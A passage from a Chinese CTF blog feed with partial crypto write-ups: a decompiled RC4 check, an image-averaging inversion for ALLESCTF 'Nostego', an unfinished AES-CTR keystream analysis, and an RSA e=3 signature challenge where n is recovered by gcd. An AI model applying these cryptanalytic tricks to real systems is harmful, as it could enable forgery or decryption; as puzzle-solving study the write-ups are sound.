class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)dest) != <span class="number">32LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_23:</span><br><span class="line">    <span class="keyword">if</span> ( (v8 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> v12;</span><br><span class="line">LABEL_24:</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v9)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> v12;</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = <span class="built_in">malloc</span>(<span class="number">0x408</span>u);</span><br><span class="line">  v14 = (<span class="keyword">int32x4_t</span>)xmmword_29F00;</span><br><span class="line">  v15 = <span class="number">0LL</span>;</span><br><span class="line">  v16.n128_u64[<span class="number">0</span>] = <span class="number">0x400000004</span>LL;</span><br><span class="line">  v16.n128_u64[<span class="number">1</span>] = <span class="number">0x400000004</span>LL;</span><br><span class="line">  v17.n128_u64[<span class="number">0</span>] = <span class="number">0x800000008</span>LL;</span><br><span class="line">  v17.n128_u64[<span class="number">1</span>] = <span class="number">0x800000008</span>LL;</span><br><span class="line">  *(_QWORD *)v13 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v18 = (<span class="keyword">char</span> *)&amp;v13[v15];</span><br><span class="line">    v15 += <span class="number">8LL</span>;</span><br><span class="line">    v19 = vaddq_s32(v14, v16);</span><br><span class="line">    *(<span class="keyword">int32x4_t</span> *)(v18 + <span class="number">8</span>) = v14;</span><br><span class="line">    v14 = vaddq_s32(v14, v17);</span><br><span class="line">    *(<span class="keyword">int32x4_t</span> *)(v18 + <span class="number">24</span>) = v19;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v15 != <span class="number">256</span> );</span><br><span class="line">  v20 = <span class="number">0LL</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = (<span class="keyword">char</span> *)(v13 + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v24 = *(_DWORD *)&amp;v23[v20];</span><br><span class="line">    v21 += a12345678[v22] + v24;</span><br><span class="line">    v25 = (<span class="keyword">char</span> *)&amp;v13[v21];</span><br><span class="line">    <span class="keyword">if</span> ( v22 + <span class="number">1</span> &lt; <span class="number">8</span> )</span><br><span class="line">      ++v22;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v22 = <span class="number">0</span>;</span><br><span class="line">    *(_DWORD *)&amp;v23[v20] = *((_DWORD *)v25 + <span class="number">2</span>);</span><br><span class="line">    v20 += <span class="number">4LL</span>;</span><br><span class="line">    *((_DWORD *)v25 + <span class="number">2</span>) = v24;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v20 != <span class="number">1024</span> );</span><br><span class="line">  v26 = <span class="number">0LL</span>;</span><br><span class="line">  LOBYTE(v27) = <span class="number">0</span>;</span><br><span class="line">  LOBYTE(v28) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v27 = (<span class="keyword">unsigned</span> __int8)(v27 + <span class="number">1</span>);</span><br><span class="line">    v29 = (<span class="keyword">char</span> *)(v13 + <span class="number">2</span>);</span><br><span class="line">    v30 = v13[v27 + <span class="number">2</span>];</span><br><span class="line">    v28 = (<span class="keyword">unsigned</span> __int8)(v30 + v28);</span><br><span class="line">    v31 = v13[v28 + <span class="number">2</span>];</span><br><span class="line">    *(_DWORD *)&amp;v29[<span class="number">4</span> * v27] = v31;</span><br><span class="line">    *(_DWORD *)&amp;v29[<span class="number">4</span> * v28] = v30;</span><br><span class="line">    *((_BYTE *)dest + v26++) ^= LOBYTE(v13[(<span class="keyword">unsigned</span> __int8)(v31 + v30) + <span class="number">2</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v26 != <span class="number">32</span> );</span><br><span class="line">  *v13 = v27;</span><br><span class="line">  v13[<span class="number">1</span>] = v28;</span><br><span class="line">  v32 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *((<span class="keyword">unsigned</span> __int8 *)dest + v32) == enc[v32] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)++v32 &gt; <span class="number">0x1F</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (v8 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下次也不一定</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210904 ALLESCTFCrypto方向部分WP</title>
    <url>/posts/84da04f2/</url>
    <content><![CDATA[<p>woc，有点不对，有亿点不会</p>
<span id="more"></span>

<h1 id="ALLESCTF"><a href="#ALLESCTF" class="headerlink" title="ALLESCTF"></a>ALLESCTF</h1><h2 id="Crypto-Nostego（unsolved）"><a href="#Crypto-Nostego（unsolved）" class="headerlink" title="Crypto-Nostego（unsolved）"></a>Crypto-Nostego（unsolved）</h2><p>提供了一张图片，有一个脚本，使用该脚本对原本有flag的图片进行了加密，需要我们逆回去</p>
<p>关键代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        value = <span class="number">0</span></span><br><span class="line">        di, dj = <span class="number">1337</span>, <span class="number">42</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">            di, dj = (di * di + dj) % width, (dj * dj + di) % height</span><br><span class="line">            value += image.getpixel(((i + di) % width, (j + dj + (i + di)//width) % height))</span><br><span class="line">        result.putpixel((i, j), value / ROUNDS)</span><br></pre></td></tr></table></figure>

<p>赛后看了<a href="https://ctf.rip/write-ups/crypto/alles-nostego/">一位师傅的WP</a>，不是特别懂，感觉这位师傅找到门道了，但是不是很正规哈哈哈</p>
<p>在复现中我产生一个思路，既然是收集32个点的平均值，那么要逆回去肯定不是很完美地得到（除非我想错了），而是一种逼近：每一次反推的时候，通过一点，将其像素值（也就是另外32个点的平均值）直接赋给这32个点，当然这是一个不准确的预估。但如果这32个点被多次用到，那么每次赋给32个点的时候，与其原来的值取个平均值，这样只要被用到的次数足够，可以得到一个有点模糊的图像，也许就可以看出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: %s [infile] [outfile]&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(sys.argv[<span class="number">1</span>]).convert(<span class="string">&quot;F&quot;</span>)</span><br><span class="line">width, height = image.size</span><br><span class="line">result = Image.new(<span class="string">&quot;F&quot;</span>, (width, height))</span><br><span class="line"></span><br><span class="line">ROUNDS = <span class="number">32</span></span><br><span class="line">dic = &#123;(<span class="number">0x10001</span>, <span class="number">0x10001</span>): [<span class="number">0x10001</span>, <span class="number">1</span>]&#125;</span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line">di, dj = <span class="number">1337</span>, <span class="number">42</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">    di, dj = (di * di + dj) % width, (dj * dj + di) % height</span><br><span class="line">    d.append((di, dj))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        value = image.getpixel((i, j))</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> d[::-<span class="number">1</span>]:</span><br><span class="line">            di, dj = k[<span class="number">0</span>], k[<span class="number">1</span>]</span><br><span class="line">            x = (i + di) % width</span><br><span class="line">            y = (j + dj + (i + di)//width) % height</span><br><span class="line">            <span class="keyword">if</span> (x, y) <span class="keyword">not</span> <span class="keyword">in</span> dic.keys():</span><br><span class="line">                dic[(x, y)] = [value, <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dic[(x, y)][<span class="number">0</span>] += value</span><br><span class="line">                dic[(x, y)][<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        result.putpixel((i, j), dic[(i, j)][<span class="number">0</span>] / dic[(i, j)][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">result = result.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">result.save(sys.argv[<span class="number">2</span>])</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/ALLES.dec.png" alt="ALLES.dec"></p>
<p>竟然和那位师傅出来的差不多，好吧，虽然没看懂他的，但思路应该类似，确实不能完美还原</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/flag%EF%BC%9F.png" alt="flag？"></p>
<p>然后这位师傅借助工具看出来了，我不是很会用ps，稍微拉了下对比度，一个<code>!</code>和后面<code>c4n h4v3</code>有点看不清，就只能做到这一步吧</p>
<blockquote>
<p>ALLES!{why_so1v3_st3g0_wh3n_y0u_c4n_h4v3_crypto}</p>
</blockquote>
<p>或许还是有完美解吧，也正如这位师傅说的，就算有花的时间也比这个要多；接下去的思路，我想是多进行几遍解密，也许就可以，但事与愿违不知道为啥</p>
<p>在队友misc之神的帮助下，稍微能看点吧，看不清的地方爆破可还行；stego是真的费眼睛</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210906120605159.png" alt="image-20210906120605159"></p>
<h2 id="Crypto-Secure-Flag-Service（unsolved）"><a href="#Crypto-Secure-Flag-Service（unsolved）" class="headerlink" title="Crypto-Secure Flag Service（unsolved）"></a>Crypto-Secure Flag Service（unsolved）</h2><p>主函数如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        encrypted_password = base64.b64decode(<span class="built_in">input</span>(<span class="string">&#x27;Encrypted password&gt;&#x27;</span>))</span><br><span class="line">        password = decrypt(encrypted_password)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> password == PASSWORD:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(encrypt(FLAG)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Wrong Password!!!&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>You captured an encrypted password: <code>kgsekWGeAwPhz6tbMyLd34Bg5pwhy2TkQJF7NRYC987Ibuiu/dmNHqyYXHV0kXlksThSRi83Qu2owAiUdT9pfqlY</code></p>
</blockquote>
<p>通过交互得到的东西有点少，除非不断断开重连用作oracle</p>
<p>攻击点应该是针对AES.CTR的漏洞了，我们分别有flag和password的密文，以及他们各自的nonce，并且他们使用相同的密钥；所以流程图正如下图复制粘贴所示</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/ALLESaes.png" alt="ALLESaes"></p>
<p>保存一组数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># ncat --ssl 7b000000cf4ae1b3538a4d99-secure-flag-service.challenge.master.allesctf.net 31337</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA3_256, HMAC, BLAKE2s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int_to_bytes</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> i.to_bytes((i.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    bits = <span class="built_in">bin</span>(<span class="built_in">int</span>.from_bytes(s, byteorder=<span class="string">&#x27;big&#x27;</span>))[<span class="number">2</span>:]</span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> bits:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> random.randrange(<span class="number">0</span>, <span class="number">2</span>):</span><br><span class="line">                ret += <span class="string">&#x27;01&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret += <span class="string">&#x27;10&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret += <span class="string">&#x27;00&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> int_to_bytes(<span class="built_in">int</span>(ret, base=<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">s</span>):</span></span><br><span class="line">    bits = <span class="built_in">bin</span>(<span class="built_in">int</span>.from_bytes(s, byteorder=<span class="string">&#x27;big&#x27;</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(bits) % <span class="number">2</span>:</span><br><span class="line">        bits = <span class="string">&#x27;0&#x27;</span> + bits</span><br><span class="line"></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(bits[i] + bits[i + <span class="number">1</span>], base=<span class="number">2</span>):</span><br><span class="line">            ret += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> int_to_bytes(<span class="built_in">int</span>(ret, base=<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        aes = AES.new(key=encryption_key, mode=AES.MODE_CTR, nonce=c[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">        decrypted = aes.decrypt(c[<span class="number">8</span>:])</span><br><span class="line">        message, tag = decode(decrypted[:-<span class="number">16</span>]), decrypted[-<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">        HMAC.new(key=mac_key, msg=message).verify(mac_tag=tag)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Get off my lawn or I call the police!!!&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encrypted_password = <span class="string">b&#x27;kgsekWGeAwPhz6tbMyLd34Bg5pwhy2TkQJF7NRYC987Ibuiu/dmNHqyYXHV0kXlksThSRi83Qu2owAiUdT9pfqlY&#x27;</span></span><br><span class="line">c = <span class="string">b&#x27;IQPhJuaTSjms0snUwrXJjw7cQ0m3OwVzqQzhGej+A7J28tdoUaeokeQgDHhfokZEDJyectu/1x45ieK7YgHjS0LZkddFEn7jui8BQYM8BaIDrSYQ3dC36RUKYiZ6bg==&#x27;</span></span><br><span class="line">encrypted_password = base64.b64decode(encrypted_password)</span><br><span class="line">c = base64.b64decode(c)</span><br><span class="line"><span class="comment"># password = decrypt(encrypted_password)</span></span><br><span class="line">nonce1 = encrypted_password[:<span class="number">8</span>]</span><br><span class="line">nonce2 = c[:<span class="number">8</span>]</span><br><span class="line">encrypted_password = encrypted_password[<span class="number">8</span>:]</span><br><span class="line">c = c[<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># encryption_key = BLAKE2s.new(data=PASSWORD + b&#x27;encryption_key&#x27;).digest()</span></span><br><span class="line"><span class="comment"># mac_key = BLAKE2s.new(data=PASSWORD + b&#x27;mac_key&#x27;).digest()</span></span><br><span class="line">mac_key = <span class="string">b&#x27;123456&#x27;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>不会啊，等WP就鸽了</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210908 人在寝室坐题从天上来疑似江西吉林省赛Crypto方向部分WP</title>
    <url>/posts/e245e3dc/</url>
    <content><![CDATA[<p>今天东北的师傅给了他们那边比赛的三密码道题，期间看了第一道，求出n之后就没思路了；还有两道赛后复现的，都是AES.CBC，第二道从尚师傅那里获得提示，跳开了CBC模式本身，攻击点在pad；第三道pad可以利用的点被抹除了，并给了一个看似需要攻击的地方，但攻击点却在CBC模式本身</p>
<p>好了，我宣布尚师傅最强，实验室密码顶梁柱，我就是尚师傅的WP手，专门记录尚师傅出过的题目</p>
<p>以及被IO支配的恐惧</p>
<span id="more"></span>

<h2 id="Yusa的日常生活—美国大选（recuring）"><a href="#Yusa的日常生活—美国大选（recuring）" class="headerlink" title="Yusa的日常生活—美国大选（recuring）"></a>Yusa的日常生活—美国大选（recuring）</h2><p>一开始只给了个nc，在Your vote后面输入一个十进制的数字，尝试复制上面的send过去，得到如下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210908123225549.png" alt="image-20210908123225549"></p>
<p>可以通过尝试看出e=3（依次send<code>1</code>,<code>2</code>,<code>3</code>这样一些比较小的数，得到的是各自立方转字节后的结果），猜测底层和RSA有关</p>
<p>后来才上了源码，关键的逻辑如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">r&quot;Form of vote:&#123;voter&#125;:&#123;votee&#125;! eg: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Yusa:Trump!&quot;</span>)</span><br><span class="line">vote = <span class="built_in">pow</span>(bytes_to_long(<span class="string">b&quot;Yusa:Trump!&quot;</span>), d, p * q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vote:&quot;</span>, vote)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    yusa = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Your vote: &quot;</span>))</span><br><span class="line">    vote = long_to_bytes(<span class="built_in">pow</span>(yusa, e, p * q)).split(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(vote)</span><br><span class="line">    <span class="keyword">if</span> vote[-<span class="number">1</span>] == <span class="string">&quot;Trump!&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag[:<span class="number">10</span>])</span><br><span class="line">    <span class="keyword">elif</span> vote[-<span class="number">1</span>] == <span class="string">&quot;Biden!&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag[<span class="number">10</span>:])</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(e))</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure>

<p>RSA签名以及选择明文攻击，像下面这样可以搞出n来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="number">11441834613624826172418663634046279113882505385891956376343615067285261133850481718598387372799863015467637880949144273419549065969128475439028853349338539694499051803136413392677937180372746004434886408226683060356000756320682607488203211095719491230534679239863637181733978031967798145219807433667347849650017657700970435971961705992349692203870546936934197834532861409558927204969349851725967348387731892180785297131580108320422093208933302332371110292195085685318752738251192012489360801049345566481979567998761296129083101798420484839100061738554182863915465349499485814533228278687226339268848069597015443528832</span></span><br><span class="line">c2 = <span class="built_in">int</span>(iroot(m, <span class="number">3</span>)[<span class="number">0</span>]) + <span class="number">0x10001</span></span><br><span class="line">c4 = c2 ** <span class="number">2</span></span><br><span class="line">c8 = c2 ** <span class="number">3</span></span><br><span class="line">m2 = <span class="string">b&#x27;:&#x27;</span>.join([<span class="string">b&#x27;Z\xa3\x04\x9a\xf5Co\x84xu?\xf4\xda\xd9%;\x81\xa6\x85=\x80Fp&lt;\xf5\x01M2\x16\x15\xe0\xc5\xc3\xa4\x04\xc1\xe1\xc8)\xe6\xa0\xdeDX&amp;\x90\xad\x00\x89a%C\xdek\xed\xde\xc8&#123;\xf0\x7fW&#x27;</span>, <span class="string">b&quot;\xc8t\x81\xaaQ\xd5/D\xa0r]\x16\x8b\xbf=b\x19\x11\xf2V\xf0\xd7&gt;\x8b\xa1=T0\x92\x15?\xbdR&#123;\x0b\x91\xfbF\xf5H\xd7 [\xf9\xd1E\x12B3\xcf\x04VE\x9a\xa6K&lt;\xc2-\x1b&gt;V\xa8\x19\xfa\xf9\x8a\xc5_o\xf0)u\xb4\x92l\x1al=\xe9\n\x00C\x7f\x06\xd4\xf9\xfc\xeaX\x901\xceZ\xde\xcc 7\xb2j\x86-i\xbc|\x81\xf0\x08\r\x03\x16\x0c\x8aN\x18\xc90\xfc\xd8\x87\x07&#125;A&#x27;D[\xa9\xb9\xb1\x11$N&#123;\x10\x05\xab\x0e\x86~\xff\rT\xe3\xd7%\xb4\x8d6\x95\x9a\x96;\xc4h~\xe3\xbab\xecC\x9b\xf11&#x27;c\xfc&amp;\xe3\x11\x850\xe5\xaf\t\xf1\x83\x83\x15M\x84=\x92\x8c\xda\xb9\xd7\xb2\x1e\x05\x9c\x1b\xb7\x06\xe8&quot;</span>])</span><br><span class="line">m4 = <span class="string">b&#x27;:&#x27;</span>.join([<span class="string">b&quot;eW\xd5\xbd\x08w\x0c\xc9I\xac\x17\xecE\xcb\xda\xfd^;\xa4\xf7\xa6\xf3\x04PE/A\xe5qK\xe9JOm\xee\xd1h\xf7o\xa8\x1c\xa0\x068\xb3\xf1\xe7\x7f-\x9f\x19\xb4j\xa3\x90\x07\x1c\xb7\x12z\xad9A\xb9\xa7\xee\x8eBI\xd0]0\t\x9a\x08]\xbb\x1a\xca\x137&#125;G\xc1\xfa\x14\xd1\t\xad\x1d\x1e\xa1\xb4\x88\x1a\x8d\xd3\x8a\xbcU\x86\x00Im\x05\xaaVJ(\xa9\x04rS\x00\x19\x02\x18\x8a\xa0g4\xcdg!9\xf5\x98z\xcc\x9b\x84\xd5&gt;x\x13\xe2\xcd&#x27;1\x8b3a\xe6\x93\xd3\xa4\x06\xe0\xe9\x1aO\xa9\xb5\xe7@\xe8\x9atv\x8d\xf8_rK\xf2u\xf1\x04\x7f\xb45\xdf\x0f\x87\x97V\x15\xcc\xda\xd3\x8c\x8b\xd2V\x1e\x1d\xbd\xd1&#x27;\xca\xaa\xec\x1c\xee\xed\xe0\r6\xd7\xd3\x93;\x1e@Z\xaf6\xc4\xae\xe0\xe3\xbf\x85\xfd\x8f\x0b\xd9\xce^`\xbc\xc8\x7f\xfbQ\xd7\xae\xc8\x9bL\x02^\xcf\xbd\xcc\xa4D\xb7\x9f\xf9\x0c\xd5\xe9\xda\xa1\x03\x9d\xed0\x9aY\x85d$(&#125;&quot;</span>])</span><br><span class="line">m8 = <span class="string">b&#x27;:&#x27;</span>.join([<span class="string">b&#x27;\x0fB\xc18\x04\x9c)\xbe\xf7J\xcc\xe2\x88\xd4\x12\xa7FwL\xa6\xc9\xf3\xaeRVV\xb6\xaeo\xd8\xc2h\xedo\xc7\xae\xd3\xf9\xab\xd6\xc43\x932\xf9\xff\xc9\xf6S\xd5\x9c\xba]f\xb6M\xde\x07\x9dx\xaaX6\xb5\x0fz\xf7\xc2\x0fY8\x81l\x14\x87\x91\x1c&amp;\x1a\xce\xc30\xc4\xdd\xe2&quot;V&amp;(J\x9eD3S*O\t\x07A\xabZ\xdd&gt;\xc0`\xc0d\xa3\xa7\xb4\xaa\xb5Tf\xae\x88\x8ex(\xf0\xaco0j\xdd\xc5\x13\xda\x86[\xee#\x18s\xe5\xfd\xb8 \xffP4\xd1\xc3\xd9\xe6\x18%\x1a\x13\x0ey+VQVb&#125;&#123;\xa5\xe1A\xa2y!Tu\xe2O\xf649\xa5u?\xbb\x02\xe4\x95z\xfef\x9c\x92E\x15\xadM\t\x98\x8dj\xd9\xd9wU\x93#;\xb6\xa2\x08\xe73\xcf\xf7;\xc7/\xc9\x0e\xa3\xf6\x18\xd2\xe8\xd7\xac\&#x27;\x07\xe6c\xc5\xedEhvf\xcdO\x11\xaf\xac^Y(&#123;\x19!\x81_h\x9c\x15\xfb\xbd\x0f\x89\xe8\xc6U0MM\xe0\x89&#125;&#x27;</span>])</span><br><span class="line">m1, m2, m3 = bytes_to_long(m2), bytes_to_long(m4), bytes_to_long(m8)</span><br><span class="line">n = gcd(m1 ** <span class="number">2</span> - m2, m1 ** <span class="number">3</span> - m3)</span><br><span class="line"><span class="comment"># n = 12998510197135204376024977476677066247754836878539929011686148268745119316209020562579171398886840449113325708748228673135311752569187260449619807807903218621065777199171595498055285073001556241300819299111213719824569275786074961700296240844459968460491714678805615009589712788617029938309306389913328704049259197596077475679388746327337019377724684383107233046619031888347065776485290701116620689771500575467431146354734895248116917853679826521686058032549240850391628465710220654255931003952332899029099575800979554751748212159051355321567757716972030886957773638513566062484273620681928826749865617412173047445893</span></span><br></pre></td></tr></table></figure>

<p>比赛结束环境就关了，所以在本地复现下，<em>9月以后所有的附件可以在github上找到</em></p>
<p>想要交互还是挺麻烦的，这里就当于已经得到n了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">15160582676846215658796665511167073968034171296661551317484064414530852799771618235942954787122243854880075538411956180191332121712749102940834469106520160911820689656980924928940857041289182520881995375555391429116695091017132599877027688472814801911156488488572658968858514549082874942198209100374290699361245526127362315158765216477920262317888955067180876826737792124089711465313919322691350383089478781115531028327464978498168550501234908278822070734957259085100730831106569924227163225782388696667537281068625312828784413432273812618076026392105724267064367773254829708738371876092746215522784893719413972288863</span></span><br><span class="line">n = <span class="number">15746945526432122479214630433270149949898055696087559742180830690847507891453515116075588796192340169435734319815395381666689989899222866782097160453565424738446970488798269177137604678808633207375125945542218010260891606865601540037996424336907526029576270546861238099120672228457910383070027371579273232850527367464802499941689387144111902397279853997069146494099457026354542952331566285341348508821513652475468126522170376081188733013126170230888215340038166274999418672245444957134175669183047604867371997408007732297783287752312442659031828940988055885376811763957465614461850705292428963651655262273479037747317</span></span><br><span class="line">e = <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>已知enc，要用d签名一个以b’:Biden!’结尾的字节流并send过去，用e验证</p>
<p>也就是要使<br>$$<br>m=c^e\ mod\ n<br>$$<br>m在转字节流之后结尾是<code>:Biden!</code>，显然这是RSA验证的过程，我们只要用d生成某个以<code>:Biden!</code>结尾的字节流的密文<br>$$<br>c=m^{d}\ mod\ n<br>$$<br>但是n无法分解，也就是说求不出d，那唯一的攻击点只有已知末尾是<code>:Biden!</code></p>
<p>但从稍微结合实际一点的角度出发，这个加密系统是为了投票而设立的，想知道最后一部分是什么，就是想知道票投给了谁了，加上用d来签名，是为了验证这是谁投的票，莫名其妙就遇到了老师上《安全协议与标准》的投票情景。所以，这么看的话，这个加密系统是没有漏洞的，除非n是特殊的，但是目前ctf的常用手段并没有更加明朗的指向，只能按下不表了，希望到时候有WP</p>
<hr>
